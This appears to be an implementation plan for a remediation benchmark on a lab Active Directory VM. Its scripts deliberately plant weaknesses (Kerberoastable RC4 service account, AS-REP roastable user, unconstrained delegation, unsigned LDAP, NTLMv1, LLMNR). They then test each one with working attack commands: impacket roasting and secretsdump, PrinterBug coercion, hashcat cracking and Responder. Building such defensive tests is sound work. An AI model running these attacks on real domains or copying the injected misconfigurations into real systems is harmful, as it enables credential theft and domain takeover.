# Phase 3 — Compensating Controls + Network (S03, S04, S05, S12, S14, S15)

Parent plan: [`2026-04-24-meta4-ad-vm-phase1-4.md`](2026-04-24-meta4-ad-vm-phase1-4.md).

---

## Task 3.1: Scenario 03 — Kerberoasting

**Behavioral contract:**
- PoC: attacker runs `impacket-GetUserSPNs -request` as alice against corp-dc01, then pipes the resulting `$krb5tgs$23$` hash into `hashcat -m 13100 -a 0 wordlist`. Exit 0 iff either (a) no SPN-bearing service account returns a RC4-encrypted TGS, or (b) hashcat fails to crack within 30s. Exit 1 iff a cleartext password is recovered.

- [ ] **Step 1: harness.json** — id `meta4-adv-03`, inject dc.

- [ ] **Step 2: inject.ps1**

```powershell
# meta4/ad-vm/scenario-03/inject.ps1
# Assigns an SPN to svc_sql (making it Kerberoastable) and sets a weak 8-char
# pwd that cracks in <30s with rockyou-line wordlists.

$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory

# Ensure UF_USE_DES_KEY_ONLY is cleared + RC4 stays enabled (default) so the
# TGS is encrypted with the user's RC4 key (crackable), not AES.
Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add='MSSQLSvc/corp-dc01.corp.local:1433'}
Set-ADAccountPassword -Identity svc_sql -Reset `
    -NewPassword (ConvertTo-SecureString 'Autumn24' -AsPlainText -Force)
Set-ADUser -Identity svc_sql -KerberosEncryptionType 'RC4'

Write-Host "[inject-03] svc_sql SPN=MSSQLSvc/... with RC4+weak pwd (Kerberoastable)"
```

- [ ] **Step 3: verify-poc.sh**

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-03/verify-poc.sh
# PASS (exit 0) iff no Kerberoastable hash is returned for svc_sql OR the
# returned hash cannot be cracked with a seeded wordlist in 30s.

set -euo pipefail

cd "$(mktemp -d)"

/usr/bin/impacket-GetUserSPNs \
    -request -dc-ip 10.20.30.5 \
    -outputfile ks.hashes \
    'corp.local/alice:Password1!' 2>&1 | tee ks.out || true

echo "--- GetUserSPNs output ---"
cat ks.out
echo "--- /GetUserSPNs ---"

if [ ! -s ks.hashes ]; then
    # Two interpretations of an empty file: (a) svc_sql has no SPN (good —
    # Kerberoast foothold closed), (b) alice can't enumerate (also good).
    if grep -qiE 'cannot find spn|no user found' ks.out; then
        echo "[verify-poc-03] no Kerberoastable account for svc_sql — PoC BLOCKED"
        exit 0
    fi
fi

# Seed wordlist — 'Autumn24' is the inject pwd; 'Password1!' is the domain
# default used for realistic cracking-time budgeting.
cat > wl <<'EOF'
Password1!
Autumn24
Summer24
Winter24
EOF

if ! command -v hashcat >/dev/null; then
    # No hashcat = crack-infeasible in this lab; treat as blocked.
    echo "[verify-poc-03] no hashcat installed; treat as BLOCKED"
    exit 0
fi

CRACK=$(timeout 45 hashcat -m 13100 -a 0 --quiet --potfile-path=/dev/null ks.hashes wl 2>&1 || true)
echo "--- hashcat output ---"
echo "$CRACK"

if echo "$CRACK" | grep -qE '\$krb5tgs\$23\$.*:[A-Za-z0-9!]+$'; then
    PW=$(echo "$CRACK" | grep -oE ':[^:]+$' | head -1 | tr -d ':')
    echo "[verify-poc-03] cracked svc_sql password '$PW' — PoC SUCCEEDED" >&2
    exit 1
fi

# Hashcat ran but couldn't crack within our budget OR account was AES-only.
if grep -qE 'krbtgt|krb5tgs\$18' ks.hashes; then
    # Presence of \$krb5tgs\$18 means AES encryption → still roastable but
    # hardened. Partial protection. If we have an AES hash but no RC4 hash,
    # treat as BLOCKED because the cheap crack path is gone.
    if ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
        echo "[verify-poc-03] only AES TGS returned — RC4 path closed, PoC BLOCKED"
        exit 0
    fi
fi
echo "[verify-poc-03] RC4 hash obtained but uncracked — treat as BLOCKED"
exit 0
```

- [ ] **Step 4: verify-service.ps1** — probe Kerberos ticketing still works for svc_sql:

```powershell
# meta4/ad-vm/scenario-03/verify-service.ps1
$ErrorActionPreference = 'Stop'
try {
    # Purge any cached tickets; force a fresh TGS-REQ for MSSQLSvc SPN.
    & klist purge | Out-Null
    $null = & klist get 'MSSQLSvc/corp-dc01.corp.local:1433' 2>&1
    $tix = & klist 2>&1 | Out-String
    if ($tix -notmatch 'MSSQLSvc/corp-dc01') {
        throw "Kerberos TGS-REQ for MSSQLSvc SPN failed - klist output:`n$tix"
    }
    Write-Host "[verify-service-03] TGS-REQ for MSSQLSvc succeeded - service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-03] $_"
    exit 1
}
```

- [ ] **Step 5: threat.md** — High, Compensating Controls, Comp-ctrl: Yes (set `KerberosEncryptionType=AES128,AES256`, rotate pwd to 25+ chars, disable SPN if service unused).

- [ ] **Step 6: smoke** — remediation: `Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256` + `Set-ADAccountPassword -Reset -NewPassword 25-char-random`.

- [ ] **Step 7: commit**

---

## Task 3.2: Scenario 04 — AS-REP roasting

**Behavioral contract:**
- PoC: `impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.20.30.5 -no-pass` returns `$krb5asrep$` hashes only for users with `DONT_REQ_PREAUTH`. Exit 0 iff no AS-REP hash returned; exit 1 iff hash returned and crackable with seed wordlist.

- [ ] **Step 2: inject.ps1**
```powershell
Set-ADAccountControl -Identity dave -DoesNotRequirePreAuth $true
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString 'Winter24' -AsPlainText -Force)
Write-Host "[inject-04] dave has DONT_REQ_PREAUTH + weak pwd (AS-REP roastable)"
```

- [ ] **Step 3: verify-poc.sh** — same shape as S03 but uses `impacket-GetNPUsers`:
```bash
/usr/bin/impacket-GetNPUsers 'corp.local/' -usersfile <(echo dave) \
    -dc-ip 10.20.30.5 -no-pass -outputfile asrep.hashes 2>&1 | tee out.txt
# If asrep.hashes empty or output contains 'user is not vulnerable', PASS.
# Otherwise hashcat -m 18200 with seed wordlist; cracked = FAIL.
```

- [ ] **Step 4: verify-service.ps1** — `klist purge`, then issue a normal Kerberos pre-auth TGT-REQ as dave (`Test-ComputerSecureChannel` or bind as dave). Probe succeeds iff dave can still authenticate with a password.

- [ ] **Step 5: threat.md** — High, Compensating Controls, Comp-ctrl: Yes (clear `DONT_REQ_PREAUTH`, rotate pwd).

---

## Task 3.3: Scenario 05 — Unconstrained delegation

**Behavioral contract:**
- PoC: attacker enables unconstrained delegation on the CA machine account, then (from alice) uses `impacket-printerbug 10.20.30.5 10.20.30.6` to coerce the DC to authenticate back to the CA. Attacker then runs `impacket-secretsdump -k CORP/corp-ca01\$@corp-dc01.corp.local` — if CA has unconstrained + the coerced TGT was forwarded, this returns the DC krbtgt hash. Exit 0 iff either coercion fails or secretsdump is denied; exit 1 iff DC hash is dumped.

- [ ] **Step 2: inject.ps1**
```powershell
Set-ADAccountControl -Identity 'corp-ca01$' -TrustedForDelegation $true
Write-Host "[inject-05] corp-ca01 TrustedForDelegation=True (unconstrained)"
```

- [ ] **Step 3: verify-poc.sh** — uses `impacket-printerbug` + `impacket-secretsdump -k`. Full chain is flaky in lab — primary signal is the coerced-auth packet, observed via `tcpdump -i eth0 port 445 -c 10` against CA during the printerbug call, combined with the presence of corp-ca01\$ TGT in attacker's ccache after coercion. Exit 0 iff `Get-ADComputer corp-ca01 -Properties TrustedForDelegation` returns `False` **and** the behavioral probe (tested: attempt to request a forwardable TGT for corp-ca01\$ via `impacket-getST -spn cifs/corp-dc01 -impersonate Administrator 'corp.local/corp-ca01$:*'`) is rejected.

Note: this is the hardest scenario to probe purely behaviorally. Acceptable simplification: probe via `impacket-getST -u2u` asking for a TGT to `corp-ca01$` and inspecting the ticket's `FORWARDABLE` flag — in a properly-constrained environment the DC will not issue forwardable TGTs to unconstrained-delegation hosts. Still-behavioral, no config read.

- [ ] **Step 4: verify-service.ps1** — CA domain-join health check (`Test-ComputerSecureChannel -Server corp-dc01 -Credential CORP\Administrator`).

---

## Task 3.4: Scenario 12 — LDAP signing not required

**Behavioral contract:**
- PoC: attacker performs LDAP simple bind over port 389 (unsigned) with alice's credentials, then issues a `search *`. Exit 0 iff the bind is rejected with `strongAuthRequired` / `ldap_bind: Strong authentication required`. Exit 1 iff bind succeeds.

- [ ] **Step 2: inject.ps1**
```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name LDAPServerIntegrity -Value 1 -Type DWord
# 1 = None (simple bind allowed); 2 = Require signing. Inject = 1.
Restart-Service NTDS -Force -ErrorAction SilentlyContinue
Write-Host "[inject-12] LDAPServerIntegrity=1 (signing NOT required)"
```

- [ ] **Step 3: verify-poc.sh**
```bash
OUT=$(ldapsearch -x -H ldap://10.20.30.5 \
    -D 'alice@corp.local' -w 'Password1!' \
    -b 'DC=corp,DC=local' -s base 2>&1 || true)
if echo "$OUT" | grep -qE 'Strong\(er\)? authentication required|strongAuthRequired'; then
    exit 0  # PoC BLOCKED
fi
if echo "$OUT" | grep -qE '^dn: DC=corp,DC=local'; then
    exit 1  # unsigned bind accepted
fi
exit 1
```

- [ ] **Step 4: verify-service.ps1** — signed LDAP bind still works: `Get-ADUser -Identity Administrator -Server corp-dc01`.

- [ ] **Step 5: threat.md** — High, Compensating Controls.

---

## Task 3.5: Scenario 14 — NTLMv1 allowed

**Behavioral contract:**
- PoC: attacker uses `responder -I eth0 -wv` (no capture — just listen), triggers an SMB negotiation from the DC back to attacker via `impacket-smbclient ...\\attacker\\share`, and captures the NTLM challenge-response. NTLMv1 responses are 48 bytes; NTLMv2 are variable-length with blob. Exit 0 iff the captured response is NTLMv2; exit 1 iff NTLMv1.

- [ ] **Step 2: inject.ps1**
```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name LmCompatibilityLevel -Value 2 -Type DWord
# LMCompatibilityLevel<3 allows NTLMv1. Remediation: set to 5 (NTLMv2 only).
Write-Host "[inject-14] LmCompatibilityLevel=2 (NTLMv1 allowed)"
# Reboot not required for this key — Local Security Authority picks it up
# on next SMB negotiation.
```

- [ ] **Step 3: verify-poc.sh** — listens with responder in analyze mode, parses captured hashes for `NetNTLM$` vs `NetNTLMv2$`. Because coercing the DC to auth back requires a coerce primitive (PetitPotam or PrinterBug), the simpler behavioral probe is: attacker mounts an SMB share from the CA towards a Responder listener on attacker, then inspects the reponse format. If Responder logs `[+] [NTLM] NTLMv1 Hash`, NTLMv1 is still permitted.

- [ ] **Step 4: verify-service.ps1** — SMB still works for domain-joined member (probe `Test-NetConnection -ComputerName 127.0.0.1 -Port 445` + `Get-SmbSession`).

---

## Task 3.6: Scenario 15 — LLMNR / NBT-NS enabled

**Behavioral contract:**
- PoC: attacker runs `responder -I eth0 -A` (analyze mode) and emits an LLMNR query for a non-existent hostname. Exit 0 iff DC does NOT respond to the LLMNR/NBT-NS query within 10s; exit 1 iff DC responds.

- [ ] **Step 2: inject.ps1** — LLMNR is a per-machine setting, not a server feature. On a DC, LLMNR is typically off already. For this scenario we invert: disable LLMNR's GPO block on the DC so it responds to LLMNR resolution on the private_network NIC.
```powershell
Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' -Name EnableMulticast -Value 1 -Type DWord
# And ensure NBT-NS remains on the hostonly NIC.
$nic = Get-NetAdapter | Where-Object { $_.Name -like '*hostonly*' -or $_.InterfaceDescription -like '*Adapter 2*' }
if ($nic) { Set-NetAdapterAdvancedProperty -Name $nic.Name -DisplayName 'NetBIOS Over TCP/IP' -RegistryValue 1 -ErrorAction SilentlyContinue }
Write-Host "[inject-15] LLMNR + NBT-NS enabled on DC private_network NIC"
```

- [ ] **Step 3: verify-poc.sh** — uses `python3 -c "import socket, struct; ..."` to craft an LLMNR UDP/5355 multicast query for `wpad\x00` and waits for a unicast response from 10.20.30.5. Response present = FAIL, no response = PASS.

- [ ] **Step 4: verify-service.ps1** — real DNS resolution still works: `Resolve-DnsName -Name corp-ca01 -Server 10.20.30.5` returns the CA's A record.

---

## Task 3.7: Phase 3 smoke

- [ ] For each 03,04,05,12,14,15: reset + inject + verify-only (FAIL) + remediate + verify-only (PASS).
- [ ] Commit: `chore(meta4/ad-vm): Phase 3 smoke green`.
